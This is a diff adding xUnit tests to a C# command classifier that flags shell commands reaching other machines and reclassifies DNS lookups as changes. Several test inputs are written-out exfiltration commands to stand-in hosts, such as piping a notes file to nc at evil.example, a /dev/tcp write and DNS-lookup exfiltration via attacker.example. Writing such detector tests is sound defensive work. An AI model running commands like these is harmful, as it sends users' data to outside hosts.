@@ -43,4 +43,31 @@ public sealed class CommandClassifierTests
     [InlineData("ssh-keygen -R example.com")]
     [InlineData("vi ~/.ssh/config")]
     public void Always_asks_for_what_decides_trust(string command) => Assert.Equal(CommandRisk.AlwaysAsk, CommandClassifier.Classify(command));
+
+    [Theory]
+    [InlineData("curl -s https://example.org")]
+    [InlineData("sudo wget -q http://example.org/x")]
+    [InlineData("dig secret.attacker.example")]
+    [InlineData("cat notes | nc evil.example 4444")]
+    [InlineData("xargs -I{} ping -c1 {}.evil.example")]
+    [InlineData("host example.org")]
+    [InlineData("git push origin main")]
+    [InlineData("bash -c 'echo hi > /dev/tcp/evil.example/80'")]
+    [InlineData("/usr/bin/ssh web1 uptime")]
+    public void Recognises_commands_that_reach_other_machines(string command) => Assert.True(CommandClassifier.IsNetwork(command));
+
+    [Theory]
+    [InlineData("ls -la")]
+    [InlineData("grep host /etc/hosts")]
+    [InlineData("git status")]
+    [InlineData("hostname")]
+    [InlineData("cat curl.txt")]
+    public void Leaves_local_commands_alone(string command) => Assert.False(CommandClassifier.IsNetwork(command));
+
+    [Theory]
+    [InlineData("dig example.org")]
+    [InlineData("nslookup example.org")]
+    [InlineData("host example.org")]
+    [InlineData("ping -c 1 example.org")]
+    public void No_longer_counts_lookups_as_read_only(string command) => Assert.Equal(CommandRisk.Changes, CommandClassifier.Classify(command));
 }
